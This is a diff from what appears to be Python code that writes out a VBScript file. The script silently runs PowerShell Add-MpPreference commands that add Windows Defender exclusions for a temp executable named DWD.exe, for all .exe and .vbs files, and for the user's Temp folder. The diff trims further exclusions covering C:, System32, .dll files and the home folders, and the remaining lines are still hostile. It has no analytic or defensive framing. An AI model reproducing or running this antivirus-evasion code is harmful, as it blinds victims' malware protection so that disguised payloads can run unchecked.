@@ -50,34 +50,13 @@ Set objShell = WScript.CreateObject("WScript.Shell")
 objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '\AppData\Local\Temp\DWD.exe'", 0, True
 
 Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '\AppData\Local\Temp\WindowsDefender.exe'", 0, True
-
-Set objShell = WScript.CreateObject("WScript.Shell")
 objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionExtension 'exe'", 0, True
 
 Set objShell = WScript.CreateObject("WScript.Shell")
 objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionExtension 'vbs'", 0, True
 
 Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionExtension 'dll'", 0, True
-
-Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath 'C:'", 0, True
-
-Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath 'C:\Windows'", 0, True
-
-Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath 'C:\Windows\System32'", 0, True
-
-Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath {str(Path.home())}", 0, True
-
-Set objShell = WScript.CreateObject("WScript.Shell")
 objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '{str(Path.home())}\AppData\Local\Temp'", 0, True
-
-Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "cmd /c powershell.exe Add-MpPreference -ExclusionPath '{str(Path.home())}\AppData\Roaming'", 0, True
         ''')       
         text_file.close()
 
